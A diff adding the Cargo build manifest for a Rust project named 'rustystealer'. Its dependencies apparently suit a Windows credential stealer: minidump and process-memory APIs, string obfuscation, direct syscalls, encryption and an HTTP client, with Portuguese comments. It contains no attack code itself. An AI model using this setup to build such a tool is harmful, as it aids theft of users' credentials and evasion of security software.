@@ -1,0 +1,30 @@
+[package]
+name = "rustystealer"
+version = "0.1.0"
+edition = "2021"
+
+[profile.release]
+opt-level = "z"          # Otimiza tamanho
+lto = true               # Link-time optimization
+codegen-units = 1        # Melhor otimização
+strip = true             # Remove símbolos
+panic = "abort"          # Binário menor
+
+[dependencies]
+winapi = { version = "0.3", features = [
+    "winnt", "minwinbase", "minidumpapiset", "dbghelp",
+    "processthreadsapi", "memoryapi", "handleapi",
+    "securitybaseapi", "winbase", "tlhelp32", "psapi"
+] }
+windows = "0.58"         # Alternativa moderna
+reqwest = { version = "0.12", features = ["blocking", "rustls-tls"] }
+aes = "0.8"
+cbc = "0.1"
+base64 = "0.22"
+rand = "0.8"
+obfstr = "0.4"           # Ofusca strings
+syscalls = "0.6"         # Syscalls diretos
+dirs = "5.0"             # Paths de sistema
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+chrono = "0.4"
